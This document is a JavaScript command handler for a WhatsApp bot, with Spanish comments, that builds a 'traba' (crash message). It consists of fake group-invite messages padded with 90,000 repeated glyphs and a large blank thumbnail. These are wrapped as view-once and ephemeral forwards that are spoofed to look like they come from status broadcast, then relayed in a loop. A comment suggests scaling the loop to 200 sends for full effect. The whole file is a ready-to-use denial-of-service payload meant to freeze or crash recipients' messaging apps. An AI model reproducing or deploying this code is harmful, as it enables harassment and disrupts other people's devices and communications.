let handler = async (m, { conn }) => {
  // Comparar solo los números sin el dominio para asegurar coincidencia
  const senderNumber = m.sender.split('@')[0];
  const botNumber = conn.user.id.split('@')[0];

  if (senderNumber !== botNumber) return m.reply(`❌ *SOLO EL NÚMERO DEL BOT PUEDE USAR ESTE COMANDO*`);

  const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
  const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
  const channelJid = '120363999999999999@g.us'; // Modifica si deseas otro canal real
  const thumbnailFake = Buffer.alloc(90000);

  const fakeInviteContent = {
    groupJid: channelJid,
    inviteCode,
    groupName,
    jpegThumbnail: thumbnailFake
  };

  const wrappedViewOnce = {
    viewOnceMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  const wrappedEphemeral = {
    ephemeralMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  // Puedes ajustar cuántas veces se envía aquí
  for (let i = 0; i < 5; i++) { // cambia 5 por 200 si quieres efecto completo
    await conn.relayMessage(
      m.chat,
      {
        forward: {
          key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
          },
          message: wrappedViewOnce
        }
      },
      { messageId: generateMessageID() }
    );

    await conn.relayMessage(
      m.chat,
      {
        forward: {
          key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
          },
          message: wrappedEphemeral
        }
      },
      { messageId: generateMessageID() }
    );
  }

  m.reply('✅ *Traba canal enviada por el bot correctamente.*');
};

handler.command = ["lagcanalplus", "canalcrash", "traba2"];
export default handler;

function generateMessageID() {
  return Math.random().toString(36).substring(2, 15);
}